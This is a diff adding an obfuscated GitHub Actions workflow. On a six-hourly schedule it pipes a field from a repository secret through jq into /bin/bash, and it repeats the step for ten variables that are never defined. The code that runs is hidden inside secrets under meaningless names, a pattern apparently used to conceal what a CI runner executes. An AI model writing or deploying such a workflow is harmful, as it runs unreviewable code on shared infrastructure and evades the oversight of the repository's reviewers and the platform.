@@ -1,0 +1,28 @@
+name: lijun19871010
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lijun19871010
+        env:
+          emjmy17: ${{ secrets.emjmy17 }}
+        run: |
+          echo $emjmy17 | jq -r .x3019 | /bin/bash
+          echo $kw50416 | jq -r .caoij9 | /bin/bash
+          echo $qa454 | jq -r .bm61936 | /bin/bash
+          echo $p72031 | jq -r .ox431 | /bin/bash
+          echo $c8932 | jq -r .rn7 | /bin/bash
+          echo $mmfag029 | jq -r .gkg7078 | /bin/bash
+          echo $wqk268 | jq -r .g93923 | /bin/bash
+          echo $c31 | jq -r .ai8 | /bin/bash
+          echo $kvyjv7 | jq -r .kuy9820 | /bin/bash
+          echo $bll15 | jq -r .g8251 | /bin/bash
+          echo $rbq397 | jq -r .nt3 | /bin/bash
+
